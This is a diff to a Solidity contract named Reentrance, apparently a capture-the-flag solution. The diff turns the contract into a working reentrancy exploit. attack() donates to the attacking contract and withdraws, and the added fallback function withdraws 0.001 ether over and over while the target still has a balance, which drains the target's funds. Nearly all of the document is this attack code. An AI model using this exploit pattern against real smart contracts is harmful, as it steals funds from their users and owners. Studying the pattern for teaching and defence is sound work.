@@ -9,7 +9,7 @@ interface IReentrance {
 
 contract Reentrance {
   
-  address targetAddress = 0x2dACBd8A689fe00552Af679FA71158FE41Ff28A2;
+  address targetAddress = 0xc00299135cb0c287C4cB60B31f1D784aDa5A6b41; 
   address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;
   IReentrance targetContract; 
 
@@ -18,13 +18,15 @@ contract Reentrance {
   }
 
   function attack() external payable {
-    targetContract.donate{value: msg.value}(exitAddress);
+    targetContract.donate{value: msg.value}(address(this));
     //targetContract.withdraw(address(targetContract).balance); 
-    targetContract.withdraw(targetContract.balanceOf(exitAddress)); 
+    targetContract.withdraw(0.001 ether); 
   }
 
   fallback() external payable {
-    targetContract.withdraw(targetContract.balanceOf(exitAddress)); 
+    if (address(targetContract).balance >= 0.001 ether) {
+      targetContract.withdraw(0.001 ether); 
+    }
   }
 
 }
